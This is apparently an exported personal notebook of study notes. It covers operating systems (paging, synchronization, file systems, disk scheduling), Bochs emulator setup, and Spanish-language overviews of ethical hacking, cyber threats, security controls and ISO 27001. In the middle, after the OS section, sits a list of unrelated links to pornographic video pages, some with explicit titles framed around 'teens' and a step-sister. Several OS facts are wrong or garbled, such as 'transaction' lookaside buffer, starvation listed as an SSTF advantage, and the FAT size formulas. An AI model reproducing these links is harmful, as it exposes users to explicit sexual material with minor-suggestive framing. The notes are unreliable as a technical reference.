- we mantein only few pages of over process in the ram. such a memory is called as virtual memory and the set of address which are inside the ram is also called as virtual memory
- all pages into a ram
- aument grade of multiprogramming
- is possible able to execute process where size is larger then the size of ram

Average memory access time (AMAT)
- page hit, if the page containing the byte, which CPU wants to access is present inside the RAM, then it is called as page hit
- Page fault (also called as page miss), if the page containing the byte, which CPU wants to access is not present inside the RAM, then it is calles page fault
- avg time taken to acess a byte from our computer, effective memory access time (EMAT)
- if is not in RAM the access, this is located in HDD

Transaction lookaside buffer
- we mantein few pages of our pagetable in the cache memory
- multilevel paging
- first cache, before ram

Frame Allocation
- in what frame is the process
- with memory virtual the degree of multiprogramming increase, cpu efficient is better
- heap, stack, data (where is saved the values), code (operations)
- page replacement: changes of pages of process from hard disk to ram
- thrasing, delete innecesaries page and mantein only necessaries pages
- types:
   → equal allocation, divided the frame by number of process, is not the better method
   → allocation based on process size, is divided the number of frame between all process and multiply by umber of frame in the system, normally is used the double of frames
- dynamic vs static
   → dynamic, change acording situation

Page replacement algos
- local vs global page replacement policies
   → is not possible touch another pages of another process this is in local
   → in global is possible replace with another page of every process
   → local is more importante that global
   → is preferred local because is possible complete another process, while the biggest process is executed in the same memory
- demand paging: we will not load any page of a process until CPU requests for a byte ain that page

Process Synchronization
- shared memory, code segment is a process of program
- p2 can not access the PCB of p1
- shared memory is when multiple process is related
- given and taken data between process

Critical section and non critical
- section where is possible create race condition
- critical section is when 2 process use the shared memory

Variuos conditions of synchronization
- mutal exclusion, a way of making sure that if one process is executing the cs, then other procecsses cannot enter the cs until executing process come out of the cs
- progress: a way of making sure that ia a process is not inside the cs, then it will not block other process from entering the cs
- bounded waiting: a way of making sure that there exists a bound or limit on the number of times other process are allowed to enter the cs after a process has made a request to enterthe cs and before that request is granted

Lock Synchronization mechanism
- Lock variable, lock is a boolean variable which indicates no. of process inside CS at any poiny in time
- multiprocess solution: t
- busy waiting solution: x
- implemented at user mode: 
- no hardware support

TSL Synchronization mechanism
- in this mechanism is necesary another flags called Z in assamble code, this is to block CS (critial section)
- test and set lock

Strict alternation Synchronization mechanism
- limited two processes
- 0 is for non critical and 1 is for critical, reverse of Lock variable
- switch between 2 process

Disable Interrupts Syncronization mechanism
- used interruptions between process
- this need hardware support
- this is a user mode
- in kernel mode, interruption never happen

Interesed Synchronization mechanism
- instead of one varibale
- in turn variable synch mechanism, rare we use 2 variables
- interested, indicates whether process, Pi is interested in entering the CS or not

Peterson Synchronyzation mechanism
- toun + interested
- separeted in entry section, critical section and exit section
- with global variables, interested bool[2], int toun
- local and global variables
   → local used only in the functions
   → global in all program
- no hardware is necessesary
- implement in user mode
- 2 process solution
- busy waiting solution

Producer-Consumer problem
- contains slots in buffer, a buffer is a space in memory for ex. cache, ram or registers
- is famous problem
- count, number of slots filled
- when all sloys is filled, the produces enter to sleep mode
- if slots is empty the consumer enter in sleep mode
- existe block state and ready state
- this work in user mode
- in kernel block, exists deadlock
- using semaphore to avoid deadlock, this access in kernel mode

Binary semaphores
- use of struct semaphore
- use of mutes, mutual exclution, syncronization mechanism
- use of wait and signal functions of operating system, system calls
- in structure change the value to 1 or 0 depending if is in critical section or not
- in the value L puts the process in the moment
- is independing of hardware
- wait = P = down function, signal = V = up
- is know as binary semaphore of mutex
- exists a variable named mutex
- is possible use a and b like mutex

Dinning philosopher problem
- let multiple mutexes in array
- and multiple processe in executes
- depending of processes exists semaphores
- process can take multiple semaphores
- this work like a linked list, this produced deadlock
- with reverse order is possible avoid the deadlock, getting the mutexes
- take the forks:
   → take the left fork
   → take the right fork
   → eat
   → drop the left fork
   → drop the right fork

Counting Semaphore
- like a binary semaphore but with a queue
- the element in queue contains:
   → int value
   → queue type L
- the initial values is S, this is where process is possible in critical section
- is used when is possible get multiple process in critical section

Deadlocks
- resource, any physica or virtual component in a computer
- deadlock, a situation in which two or more process are unable to proceed because each one of them is waiting for one of the others to do something
- starvation, a situation in which a runnable process is overlooked indefinitely by the schedules

Deadlock Handling methods
- Prevention
   → disable one or more of the necessary conditions of deadloxk
   → necesary conditions
      ⇒ Mutual exclusion, x
      ⇒ hold and wait, x
      ⇒ no preemption, x
      ⇒ circular wait, 
- avoidance
   → banker algorithm
   → in this is necessary predicts data
- ignorance
- detection and recovery

Introduction to File systems
- any data in hard disk is a file
- files con be various formats
- no. blocks = HD size / block size
- the files are diveded in blocks
- files use complete blocks, if the data is lowest of space is used this space and it is free the space, el espacio es restado y nos quedamos con el restante
- all OS contains functions to manage files using languages of programming
- attributes:
   → name of a file
   → type of a file
   → location of a file
   → size of a file
   → protection information o a file, read/write/delete
   → time and date
- contains logical and phisical address

Understanding File Access using System calls
- firts is created in ram, system call the application to create files
- use of create(file) to save file in HDD
- the file is split in blocks
- is possible that file is in contigous allocation or not
- File control block, manage a attributes in ram, does not exists filename, only location, size, access, type
- open(), this is a system call, return a pointer
- per process open file table
- read and write calls, read use a pointer (dir of file)
- operations:
   → creating
   → reading
   → writing
   → repositioning
   → deleting
   → truncating

File allocation methods
- Contigous method
   → simple to implement
   → time taken to read a file is very less
   → random access is very access
   → dis: size declaration problem
   → dis: external fragmentation problem, empty blocks when delete a files
   → dis: internal fragmentation problem

Linked list allocation
- non contiguos
- every file contains the address of next file block, in the begining or end
- the last file contain a null
- advantages:
   → no size declaration problem
   → no external fragmentation
- disadvantages
   → time to read/write a file is very high
   → random access takes lot of time
   → pointers waste few bytes in every block
   → internal fragmentation

Fat allocation method
- file allocation table
   → number of entries in fat = number of disk blocks in hard disk
- advantages:
   → no size declaration problem
   → no external fragmentation problem
   → random access is easier
- size of FAT = no. of entries in FAT * Size of a single entry
   → no. entries FAT = of disk blocks * size of single entry
   → (m * log_2 m) bits

Indexed allocation Method
- FAT table to entries of direction of “file”
- with random access is very fast to access to files
- use of Inode to index files in linux

Free space managment
- main responsability of file system is to allocate disk blocks to blocks of files and keep track of these files

Understanding the structure of hard disk
- exists multiple platters
- divided in tracks and tracks in blocks, cylinder is a set of tracks in the same space
- seek time, read/write head move between tracks
- rotational latency, change between blocks
- data transfer latency, reading the complete block
- the algortithm to process requests depending of track moments

Disk Scheduling algorithms
- FCFS, requests I/O first will be satisfied first by the hd
   → adv: no starvation of a request
   → depending of time of execution to scheduling the task
- total seek time = no. of cylinders movenment * total time of cross 1 cylinder
- SSTF (shortest seek time first), select the requests that requires the least movement of the disk arm from its current position,regardless of th eposition
   → adv: starvation problem
- SCAN algorithm (Elevator algorithm)
   → works exactly like an elevator
   → goes in one direction satisfying all the requests and then goes back in the other direction satisfaying the remaining requests
- C-SCAN, circular-scan
- LOOK
   → is like Scan
   → this avoid the edges if does not necesary
- C-LOOK, use of C-SCAN + LOOK

Kernel, system calls, modes of execution
- kernel is function more important and very use to execute the system, device drivers
- 2 modes, user mode and kernel mode
- programs execute en user mode
- kernel mode only execute OS

fork()
- used by a process to create a copy of itself (same address space except process id)
- parent and child process
- the executions of child is before of fork
- the child can create children if exist before fork or another fork... counter program
- disv:
   → context switching overhead
   → wastage of memory due to the maintainance of multiple copies of the same process

Threads
- heap segment
   → only save entries of stack segment
   → dynamic memory
- stack segment
   → adding one funtions
   → this is created varibales
   → local variables
   → remember the order of fn calls
   → static memory
- data segment
- code segment
- the process by default is single thread



x</rich_text>
      <rich_text link="webs https://www.xvideos.com/amateur-channels/sweetie_fox_official">/amateur-channels/sweetie_fox_official</rich_text>
      <rich_text>
/amateur-channels/the2001xperience
amateur-channels/romulo_pontess
amateur-channels/ivana_montana
pornstar-channels/tommy_wood_official
amateur-channels/allinika
pornstars/piper-perri-1
amateur-channels/polysweet
/models/catherine-count
</rich_text>
      <rich_text link="webs https://www.xvideos.com/video36076647/geisha_full_movies_">https://www.xvideos.com/video36076647/geisha_full_movies_</rich_text>
      <rich_text>
</rich_text>
      <rich_text link="webs https://www.xvideos.com/channels/big_ass_teens1#_tabVideos">https://www.xvideos.com/channels/big_ass_teens1#_tabVideos</rich_text>
      <rich_text>
</rich_text>
      <rich_text link="webs https://www.xvideos.com/video76510781/step_sister_moves_her_thick_ass_seducing_me_to_ride_my_dick">https://www.xvideos.com/video76510781/step_sister_moves_her_thick_ass_seducing_me_to_ride_my_dick</rich_text>
      <rich_text>


--------------------------------------------------------------
PRACTICAL
Creating machine
gcc, nasm, bochs
Creating:
- </rich_text>
      <rich_text weight="heavy">bximage</rich_text>
      <rich_text>, creates te images
- select option 1
- option hd - by defualt
- the kind of image is flat
- the sector size: 512
- the hard disk: 10
- name image: boot.img
- values in output: CHS=20/16/63
- </rich_text>
      <rich_text weight="heavy">bochs:</rich_text>
      <rich_text>
- select option 3
- option 6
- option 26
- in long mode select yes
- return to Bochs Options Menu
- select option 7
- before option 1
- option 1: memory ram
- enter size: 1024
- host memory 1024
- return to bochs options menu
- select option 12
- select first channel 0, 3
- channel is enable: yes
- ioaddr1: 0x1f0
- ioaddr2: 0x3f0
- IRQ: 14
- select option 4
- in type ATA: disk
- filename: boot.img
- mode: flat
- number of cylinders: 20
- headers: 16
- sectors per track: 63
- sector size: 512
- model name: Generic 1234
- bios detection: auto
- translation type: auto
- select option 15
- change floppy drive #1, option 1
- enter disk
- return to Bosh Configuration Main Menu
- select 4, to save configuration file: bochsrc

BIOS
- this initialize all hardware
- the first sector to use is 0x7c00
- this write in this first sector the program
- this enter in protected mode and long mode
- long mode is two modes, 64-bit mode and compatibility mode
- in compatibility mode, run 16 or 32 bit programs under 64 bit
- this is designed in 64 bits
- UEFI, this replace BIOS
- real mode:
   → load kernel
   → retrive information aboutr hardware
   → contains 4 segment registers:
      ⇒ cs, code segment
      ⇒ ds, data segment
      ⇒ es, extra segment
      ⇒ ss, stack segment
   → address format:
      ⇒ segment register: offset (logical address)
      ⇒ segment register X 16 + Offset = physical address
   → general purpose register
      ⇒ 8 bit: al, ah, bl, bh
      ⇒ 16 bit: ax, bx, cx, dx
      ⇒ 32 bit: eax, ebx, ecx, edx
      ⇒ 64 bit: rax, rbx, rcx, rdx, are not available

To use image is necesary install </rich_text>
      <rich_text family="monospace">bochs-x</rich_text>
      <rich_text> and </rich_text>
      <rich_text family="monospace">bochs-</rich_text>
      <rich_text>sdl
in execution before bochs enter c</rich_text>
    </node>
    <node name="cpu building" unique_id="139" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1679861282" ts_lastsave="1679863408">
      <rich_text>el primer circuito, Active low S-R latch tiene un acceso set y un reset
existe un estado no permitido en la tabla, cuando s=0, r=0 y 1 y q y nq son 1
el segundo es Active High with Enable, contiene una entrada mas que es enable, sirve para apagar el circuito
en el tercero a menos que este activo funciona a comparacion del segundo que se puede descomponer</rich_text>
    </node>
    <node name="Ethical hacking" unique_id="140" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1681070548" ts_lastsave="1683258366">
      <rich_text>Base
- need gaining unauthorized access
- hacking machine
- other machines to hack
- websites to hack
- networks


------ Paltzi
- todo lo que implica proteger el acceso o uso no autorizado de datos
- prerequisitos:
   → redes computacionales
   → desarrollo de software
   → sistemas computacionales
   → normativa y legislacion
- Roles:
   → seguridad de la informacion, governance, proteccion de datos personales, ISO 27001, data loss prevention, continuidad del negocio (ISO 22301)
   → seguridad de codigo seguro, auth, buenas practicas, OWASP, arquitectura de seguridad en apps
   → seguridad aplicativa
      ⇒ web
      ⇒ mobile
      ⇒ redes
   → criptografia
      ⇒ esteganografia
      ⇒ criptografia
   → redes:
      ⇒ hardware
      ⇒ software
   → ingenieria social
      ⇒ phising
      ⇒ vishing
   → ciberinteligencia
      ⇒ OSINT
   → forensics
   → Ethics
      ⇒ Hacktivism
      ⇒ Ethical hacking
   → scripting
      ⇒ bash
      ⇒ payloading
      ⇒ exploits
      ⇒ backdoor
   → malware

InfoSec
- manejo de politicas con empleados, pruebas de seguridad sobre la informacion
- esta protege la confidencialidad, la disponibilidad e integridad de los datos
- vulnerabilidad de dia cero, no hay manera de protegerse a la vulnerabilidad
- se debe tener un plan de contigencia si llega a violarse esta seguridad

Ciberinteligencia
- hacking team, remote control system
- se tiene el software espia y en otro el command &amp; control
- adquisicion y analisis de informacion para identificar, rastrear y predecir las capacidades, intenciones y actividades ciberneticas que ayuden a identificar amenazas

Malware
- wanna cry, uno de los peores cibertaques de la historia
- es un software malicioso

Criptografia
- es transversal en todas las demas areas
- criptografia, cifra datos
- esteganografia, oculta datos
- generalmente se combinan tecnicas de ambas areas
- caracteristicas:
   → capacidad, cantidad de bits incrustados
   → robustes, cuantos ataques puede soportar un algoritmo
   → transparencia o imperceptiilidad, que tanto afecta la calidad del archivo con nuevos datos
   → seguridad, que tan seguros son los algoritmos

codigo seguro
- se debe de tener la nociones de seguridad sobre el codigo
- escenarios de ataque posibles
- se debe de preocupar por:
   → confidencialidad de datos
   → integridad de los datos
   → disponibilidad
- manejo de owasp

Pentesting y solarwinds
- inyectar codigo malisioso en algo normal
- hace cosas que no debe de hacer
- un backdoor es una puerta de acceso para los hackers, es secreta y esta oculta
- vectores de ataque:
   → inyeccion de codigo
   → perdida de auth
   → perdida de controles de acceso
   → uso de componentetes con vulnerabilidades
   → registros y monitoreo insuficientes
   → deserializacion insegura

Seguridad forence:
- consiste en identificar la causa en el fallo de un sistema ya sea para mejorarlo o encontrar a los responsables

Seguridad en redes
- redes de computadoras, Tanenbaum y zero trust networks
- se tiene control del modem hacia adentro
- usando un firewall para tener mayor proteccion
- es recomendado tener varias politicas
- con lo remoto, se usan vpn
- estudio del trafico de red interno y externo


Comptia
offense security
ec-council
isc2</rich_text>
    </node>
    <node name="seguridad informatica" unique_id="141" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1682727110" ts_lastsave="1682727110"/>
    <node name="Ciberseguridad" unique_id="142" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1683474491" ts_lastsave="1684375391">
      <rich_text>que es
- conjunto de practicas para desarrollar, personas, politicas, procesos, tecnologias
- para proteger la empresa, sus sistemas criticos e informacion sensible de ataques digitales
- todo se basa en los ciberriesgos
- sirve para mitigacion de riesgos
   → financiero
   → reputacional
   → regulatorio
- exigencias
   → gobiernos
   → inversionistas
   → usuarios
- beneficios
   → aumento del nivel de confianza hacia mi empresa por la gestion segura de la informacion
   → compliance, incremento en nivel de cumplimiento en normativas de ciberseguridad
   → data privacy, correcto tratamiento de datos sensibles
   → availability, optimizar la disponibilidad de servicio tecnologico
   → evolution, mmejorar la imagen corporativa e ingreso a nuevos mercados
- retos
   → innovacion constante
      ⇒ nuevas tecnologias
      ⇒ zero days
   → esto es un proceso continuo, se debe de verificar constantemente
   → atacantes
      ⇒ script kiddies
      ⇒ grupos criminales
      ⇒ naciones-estado
      ⇒ hacktivistas
      ⇒ competidores
      ⇒ internos
   → implementar una cultura de seguridad en la empresa
- riesgos
   → analisis de brecha o de GAP
   → analisis de procesos internos
   → autoevaluacion
      ⇒ amenazas, tengo claras las ciber amenazas que podrian afectar la informacion de la empresa
      ⇒ alcances, que activos de informacion debo proteger de ciberataques
      ⇒ transferencia del riesgo, podria buscar apoyo en el tratamiento de riesgos identificados
      ⇒ apoyo, cuento con respaldo para implementear ciber-controles
- herramientas
   → NIST cybersecurity framework
      ⇒ identificar, comprension de la organizacion de la empresa

Diferentes campos de accion de la seguridad
- seguridad en la informacion
   → protege la informacion, su confidencialidad, la integridad y la disponibilidad
   → confidencialidad, la info solo es accesible para aquellos tengan permiso
   → disponibilidad, la informacion es accesibre y utilizable por solicitud, cuando este la requiere
   → ntegridad, la informacion debe mantenerse inalterada, a menos que se requiera
- seguridad de aplicaciones
   → una rama de la seguridad que se preocupa por introducir practicas seguras en cada uno de los ciclos de desarrollo del software
   → principales
      ⇒ entrenamiento OWASP Top 10
      ⇒ analisis estatico de codigo
      ⇒ analisis dinamico de codigo
      ⇒ arquitecturas seguras
      ⇒ owasp samm, madurez de aseguramiento de software
- seguridad en redes
   → estudia la infraestrucutra de red, su conectividad y seguridad
   → se puede estudiar usando el modelo OSI
   → principales controles
      ⇒ firewalls
      ⇒ control de acceso
      ⇒ segmentacion de redes
      ⇒ DLP
      ⇒ IPS
      ⇒ VPN
      ⇒ SIEM
      ⇒ seguridad inalambrica
      ⇒ proteccion corre
- seguridad en la nube
   → se encarga especificamente de asegurar los sistemas de computacion en la nube. tiene varias intersecciones con las demas ramas de la seguridad, seguridad es de responsabilidad compartida
   → controles
      ⇒ perimetro de seguridad corto
      ⇒ IAM
      ⇒ Replicacion, uso de multinube
      ⇒ Observabilidad
      ⇒ Gobernanza
      ⇒ Compliance
      ⇒ Manejo de datos
- seguridad fisica
   → es la proteccion de activos fisicos de la organizacion, mediante diferentes mecanismos y acciones de deteccion y prevencion de riesgos
   → controles de seguridad
      ⇒ seguridad perimetral
      ⇒ seguridad de guardias
      ⇒ entrada de llave
      ⇒ entrada a los racks
      ⇒ uso de control de accesos
      ⇒ sistemas de vigilancia
      ⇒ eliminacion segura de la informacion
      ⇒ controles medioambientales
- cultura de ciberseguridad
   → son ideas, costumbres y comportamientos sociales dn una organizacion
   → principales elementos:
      ⇒ actitudes
      ⇒ comportamientos
      ⇒ conocimiento
      ⇒ comunicacion
      ⇒ cumplimiento
      ⇒ normas
      ⇒ responsabilidades
   → el factor humano estuvo involucrado en ms del 85% de brechas de seguridad
   → pasos
      ⇒ crear objetivos estrategicos claros
      ⇒ medir el estado actual de la cultura
      ⇒ diseñar una estrategia de cambio cultural
      ⇒ revision y mejora continua del proceso
   → recomendaciones
      ⇒ proceso constante y sin fin para crear resonancia
      ⇒ tener un responsable directo de cuidar la cultura
      ⇒ debe involucrar todos los niveles de la empresa
      ⇒ hacerlo parte de la evaluacion de los empleados
      ⇒ realizar simulacros

Ciberamenazas
- malware
   → software malisioso creado para causar danio
   → afecta todo tipo de dispositivos y sistemas operativos
   → puede hacer:
      ⇒ crack passwords
      ⇒ instrusion, acceso a sistemas critico por linea de comando o similar
      ⇒ movimiento lateral, replicarse y actuar en un mismo segmento de red o VLAN
      ⇒ disponibilidad, afectar la operatividad de sistemas vitales para la empresa
      ⇒ cryptojacking, aprovechamiento del hardware del cpu
      ⇒ secuestro de datos, alterar la integridad de informacion y/o datos personales
      ⇒ zombie, controlar equipos remotamente para generar ciberataques (BotNet)
   → tipos
      ⇒ virus, modifica otros programas para difundirse
      ⇒ ransomware, cifra archivos y cobra por rescate
      ⇒ spyware, accede a passwords, keystrokes o similares
      ⇒ bots, ejecutan ciberataques dirigidos
- ransomware
   → malware que utiliza tecnicas de cifrado altamente robusto
   → muy lucrativo para ciberdelincuentes y casi siempre es dirigido a empresas
   → puede llevar desde un email, exploit o gusan
   → el ransomware contacta al atacante con el command and control
   → crea una llave para cifrar los datos
   → puede que despues de eso el atacante mande la llave, auqneu no es seguro
   → factores de riesgo:
      ⇒ direccione IP publicas sin auditar
      ⇒ firewall ausente o sin tunning
      ⇒ carencia de endpoint protection
      ⇒ no existen practicas de hardening
      ⇒ falta de cultura en seguridad
   → ciber controles
      ⇒ respaldar informacion de alta importancia
      ⇒ nunca pagar el rescate
- ingenieria social
   → conjunto de interacciones y tecnicas que se usan para manipular psicologicamente por gustos o tendencias
   → ciclo de vida
      ⇒ investigacion
         • identificacion de la victima
         • captura de informacion
         • metodo de ataque
      ⇒ hook
         • enlace exitoso con victiam
         • control de la interaccion
      ⇒ play
         • ejecuta el ataque
         • obtencion de informacion
      ⇒ exit
         • cierre de interaccion
         • eliminacion de evidencia
   → ciber controles
      ⇒ validacion de origen
      ⇒ 2FA o MFA
      ⇒ cultura en ciberseguridad
- phishing
   → tecnica de ingenieria social para el robo de datos personales y financieros, suplanta la identidad digital de empresas o bancos
   → tecnicas
      ⇒ emails scams, miles de correos falsos a usuario y empresas con datos comprometidos
      ⇒ sprear phishing, ciberataque dirigido a empresas o sectores con previo conocimiento organizacional
   → ciber controles
      ⇒ security-education, uso de gophish
      ⇒ 2FA o MFA
      ⇒ denuncia enlaces
- denegacion de servicios
   → ciberataque que afecta la disponibilidad de servicios tecnologicos por inundacion de peticiones, generacion de trafico excesivo
   → tipos
      ⇒ basados en volumen: satura el ancho de banda del sitio, se mide en bits por segundo, protocolos: UDP &amp; ICMP
      ⇒ de protocolo: consume recursos del servidor: SYN o ping de la muerte, medible en paquetes por segundo (Pps)
      ⇒ de capa de aplicacion: generados por requests masivos hacia servicios web, ahs que colapsen, se mide en requests por segundo (Rps)
   → aplicacion
      ⇒ BotNet y DDos
         • uso de redes zombies, o ataques distribuidos hacia objetivos especificos
   → ciber controles
      ⇒ seguridad como servicio
         • adquirir soluciones integrales de seguridad
      ⇒ hardening de servicios, aplicar robustes de servicio + endpoint protection y evitar configuraciones por defecto
- man in the middle
   → ciberataque que permite interceptar la comunicacion user-app
   → su objetivo es capturar informacion sensible y/o alto riesgo
   → workflow
      ⇒ se tiene una maquina intermedia entre el usuario y el server
   → tipos
      ⇒ IP Spoofing
         • se altern packets headers para suplantar una direccion IP
         • simula la peticion como si fuera confiable
      ⇒ ARP Spoofing
         • enlaza la mac address con la direccion IP de usuario legitimo
         • se conecta la victima al atacante
         • se hace envenamiento ARP
      ⇒ DNS Spooging, infiltra un DNS server, alternado los registros de direcciones web
         • altera registros que pertenecen al DNS
         • se suplantan sitios web
   → ciber controles
      ⇒ alertas en navegadores, no omitir las alertas ofrecidas por los browser
      ⇒ logging-out obligatorio, si no utilizas una app, cierra la sesion
      ⇒ uso de VPN, utilizar las bondades de las redes privadas
      ⇒ cifrar comunicaciones, utilizar TLS 1.3+ con algortimos de cifrado robusto

controles en ciberseguridad
- Gestion de accesos
   → tratamiento de que se brinda a credenciales de acceso, token o cualquier recurso que permita autenticarse
   → clasificacion
      ⇒ locales: offiline, permiten la adeministracion de accesos en archivo local
      ⇒ servicio web, online: permite la sincronia de accesos en diferentes dispositivos
      ⇒ basada en token, permite autenticacion con compoente hardware
   → beneficios
      ⇒ uso de contraseña maestra con token file
      ⇒ promueven el fortalecimiento de claves
      ⇒ son repositorios de claves debidamente cifrados
      ⇒ algunos implementan passwordless option
      ⇒ cuentan con generadores de contraseñas
      ⇒ permiten la gestion de accesos en equipos de trabajo
- Firewall
   → dispositivo o software que monitorea todo el trafico que entra o sale
   → aporta zero-trust
   → dos tipos
      ⇒ appliance en sitio, hardware instalado y configurado de acuerdo a la necesidad de la empresa
      ⇒ cloud security mode, servicio de seguridad adquiridos por demand, modulares y escalables segun necesidad
   → beneficios
      ⇒ panorama de seguridad, permite visualizar eventos en el trafico de red para la toma de decisiones
      ⇒ QoS, calidad en el servicio de la red empresarial
      ⇒ control permanente, bloquear ciberamenazas emergentes y nuevos modelos de ataque
      ⇒ canales de red seguros, permite la implementacion de VPN o tuneles dpara usos diversos
- IPS/IDS, Instrusion prevention/detection system
   → ids, es una herramienta de seguridad en la red que analiza el trafico interno para detectar actividad maliciosa y alertar al admin del sistema
   → ips, es la evolucion del IDS, este ademas de alertar, puede bloquear, capturar o eliminar paquetes malisiosos
   → funcionamiento
      ⇒ estan inline para analizar todo el trafico. identifican amenazas cmo:
         • firmas
         • anomalias
         • politicas
   → el firewall solo revisa una pequenia parte del paquete, el ids revisa todo el trafico
   → clasificacion
      ⇒ NIPS, sistema basado en la red, despues del firewall
      ⇒ HIPS, existe un software en cada computadora
      ⇒ NBA, analisa trafico inusual de tipo DDoS
      ⇒ WIPS, escanea redes WIFI, identico al NBA
   → beneficios
      ⇒ integracion con otras soluciones
      ⇒ mayor eficiencia en otros controles de seguridad
      ⇒ ahorro de tiempo
      ⇒ compliance
      ⇒ personalizable
- Correlacion y gestion de eventos (SIEM)
   → soluciones centralizadas los logs de los sistemas que se tengan (trazas)
   → como funciona
      ⇒ gestion de registros
      ⇒ correlacion de eventos y analisis
      ⇒ monitoreo de incidentes y alertas de seguridad
      ⇒ gestion de compliance e informes'
   → capacidades
      ⇒ agregacion de la informacion
      ⇒ correlacion
      ⇒ alerta
      ⇒ dashboard
      ⇒ compliance
      ⇒ retencion
      ⇒ analisis forence
   → por que usarlo
      ⇒ detectar ataques de zero day
      ⇒ normalizacion y categorizacion de logs
      ⇒ visualizacion de eventos
      ⇒ deteccion de malas configuraciones
      ⇒ puede detectar comunicaciones maliciosas y canales encriptados
- Copias de seguridad
   → copias de la informacion original, para recuperar los sistemas
   → que la puede perder
      ⇒ desastre natural
      ⇒ eliminacion accidental
      ⇒ robo
      ⇒ corrupcion de informacion
      ⇒ virus informatico
   → metodos
      ⇒ copia completa/espejo
      ⇒ copia incremental
      ⇒ copia en tiempo real
   → consideraciones
      ⇒ redundancia/replicacion de las copias de seguridad
      ⇒ cifrado de datos
      ⇒ refactorizacion
      ⇒ compresion
      ⇒ limpieza automatica de datos
      ⇒ seguridad de las copias de seguridad
      ⇒ periodo de retencion de la informacion
      ⇒ validacion de integridad
      ⇒ monitoreo
   → conceptos clave
   → RPO, punto objetivo de recuperacion, periodo maximo del que se peude tolerar perdida de informacion
   → RTOP, cantidad de tiempo entre un desastre y la recuperacion de las funciones de negocio
- cifrado
   → es el proceso de convertir informacion legible, donde queda ilegible usando procesos matematicos
   → tipos
      ⇒ simetrico
         • se usa la misma llave para cifrar y descifrar
      ⇒ asimetrico
         • se tiene dos llaves una privada y una publica
         • lo que se cifra con la publica solo puede ser descifrada con la privada y viceversa
   → consideraciones
      ⇒ tamanio de la llave, entre mas grande mas tardado
      ⇒ algoritmo de cifrado, entre mas fuerte mas recursos ocupa
- VPN
   → tecnologia que nos permite realizar conexion en una red publica como si fuera privada, esta estara cifrada
   → existe un intermediario que recibe las peticiones y la reenvia
   → por que usar:
      ⇒ por si se tiene una app que solo deba de ser interna
      ⇒ cifrar datos enviados en redes no confiables
      ⇒ ocultar tu identidad a sitios que visites
      ⇒ se pueden conectar a paginas restringidas
- endpoint protection
   → practica de proteger dispositivos, usando integracion de varias herramientas, es la evolucion de los antivirus
   → se compone de
      ⇒ clasificacion con ML
      ⇒ proteccion avanzada de multiples dispositivos
      ⇒ proteccion de navegacion web
      ⇒ DLP, data loss prevention
      ⇒ firewall integrado
      ⇒ bloqueo de phishing y ataques de correo
      ⇒ proteccion de amenazas internas
      ⇒ vista centralizadad de todos los dispositivos
      ⇒ cifrado de datos
   → con funciona
      ⇒ es un cliente servidor (EPP), este administra todos los servicios de la red
      ⇒ los clientes se pueden instalar en cada dispositivo
- BCP, plan de continuidad del negocio
   → capacidad de continuar operando y entregando productos y servicios, despues de un incidente
   → es un documento que contiene toda la informacion para continuar con este proceso
   → que se hace:
      ⇒ BIA (analisis de impacto de negocio)
         • principales funciones de negocio
         • RTO y RPO por funcion de negocio
         • Recursos requeridos por funcion de negocio
         • impacto/costo financiero
         • “           ”       operacional
         • “           ”       legal
      ⇒ analisis de riesgos
         • se busca identificar amenazas, vulnerabilidades y riesgos de la informacion
         • por cada amenaza identificada se considera su probabilidad y el impacto
         • las amenazas se pueden clasificar en naturales, causadas por el hombre o fallas de infra estrucutura
         • se pueden identificar controles y costos para cada riesgo
      ⇒ plan de recuperacion
         • desarrollar una guia que permita al negocio volver al nivel de operacion
         • eventos que desencadenan el plan
         • equipo responsable de atencion de incidentes
         • plan de recuperacion de incidentes
         • lista de contactos
      ⇒ DRP
         • inventario de infrraestructura vital
         • manual de procedimientos para restablecimiento
         • operaciones manuales para reemplazar sistemas temporalmente
      ⇒ pruebas y mantenimiento
         • probar la efectividad del plan regularmente
         • entrenar al personal para que conozca el plan
         • actualizar el plan continuamente
- DLP, data loss prevention
   → soluciones que detectan fugas de informacion en la red interna, evitan que halla extraccion de datos, en uso, movimiento y alamcenada
   → por que usarlo
      ⇒ previene fugas de informacion
      ⇒ protege informacion sensitiva personal (PII)
      ⇒ protege propiedad intelectual (IP)
      ⇒ ayuda al cumplimiento de regulaciones como CCPA, GDPR, HIPAA, entre otros
- gestion de incidentes de ciberseguridad
   → es un proceso que permite actuar de manera rapida y efectiva ante un ciberataque, es un documento o serie de documentos
   → se debe de basar en estandares internacionales, NIST 800-61r2
   → existen 4 fases
      ⇒ preparacion
         • estimamos las necesidades y establecemos procedimientos
      ⇒ deteccion y analisis
         • es identificar los signos inusuales que pueden generar dicho incidente
      ⇒ identificacion
         • identificamos que tipo de incidente fue y ocurrio, que tan grave fue
      ⇒ notificacion
         • reportamos y notificacmos a los encargados del incidente
      ⇒ clasificacion y priorizacion
         • determinar el tipo de incidente, se clasifica y se sabe que tanto afecto
      ⇒ contener, eradicar y recuperar
         • detenemos el ataque y evitar que se propague resolvemos el incidente, recuperamos los datos
      ⇒ post incidentes
         • lecciones aprendidas, identificacion del ataque, que se puede hacer para prevenir
- BYOD, bring your own device
   → sofware pirata y activadores usualmente con troyanos
   → se debe restringit su instalacion
   → considerar opciones open source o de pago
   → incluir parches de seguridad
   → mejora rendimiento
   → nuevas funcionalidades
   → evitar uso de redes publicas
   → uso de vpn si es necesario usar la vpn
   → cifrado de disco duro, en caso de perdida o robo
   → cambiar los dns

----------------------------------------------
Norma ISO 27001
- norma para auditor interno
- muy usado para el trabajo a la casa
- octubre del 2005
- organizacion internacional de estandares y por la comision electronica internacional
- 1995 - BS7799-1, mejores practicas para seguridad de la informacion
- 1998 - BS7799-2, revision a la anterior, se habla de un sistema de gestion de seguridad de la informacion
- 2000, ISO/IEC 17799, se toma la norma britanica y da lugar a la ISO 17799
- 2002, BS7799-2, ya tenia certificacion para empresas, tanto para reino unido y en otros paises
- 2005, ISO/IEC 27001, toma ambas la certificada y la propia de ellos y crea la ISO 27001:2005
